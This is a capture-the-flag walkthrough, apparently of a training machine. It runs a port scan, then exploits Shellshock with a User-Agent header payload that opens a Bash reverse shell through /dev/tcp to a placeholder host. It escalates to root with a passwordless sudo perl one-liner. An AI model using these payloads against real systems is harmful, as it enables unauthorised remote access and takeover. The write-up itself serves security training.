## Reconnaissance

A full TCP port scan was run against the target to identify the exposed services.

```bash
nmap -Pn -sC -sV -p- --open 10.10.10.56 -oN scan.txt
```

The scan shows SSH and HTTP accessible. The web application offers no obvious functionality or attack surface, and the page source reveals nothing useful either. Since the server runs CGI scripts, the **/cgi-bin/** directory is inspected, which exposes a script named **user.sh**.

![cgi-bin user.sh](/assets/images/shocker/37-1.png)
*The user.sh CGI script under /cgi-bin/*

## Vulnerability Analysis

Requesting **user.sh** triggers a file download. The request is sent to Burp Repeater for closer inspection, where the server handles it through the **GET** method. The combination of a CGI script and this server configuration points to the **Shellshock** vulnerability, which allows command execution through crafted HTTP headers.

![Shellshock vulnerability](/assets/images/shocker/37-2.png)
*Confirming the Shellshock condition*

## Exploitation

The vulnerability is exploited by injecting a payload into the **User-Agent** header. The payload runs a Bash reverse shell, giving remote command execution on the target.

```bash
User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

With a listener ready on the attacking machine, the request returns a reverse shell, and the **user.txt** flag becomes readable.

## Privilege Escalation

Checking the sudo rights of the compromised user shows that **perl** can be run as root without a password. A standard **GTFOBins** technique turns that into a root shell.

```bash
sudo perl -e 'exec "/bin/sh";'
```

The elevated shell grants access to the **root.txt** flag, completing the compromise.
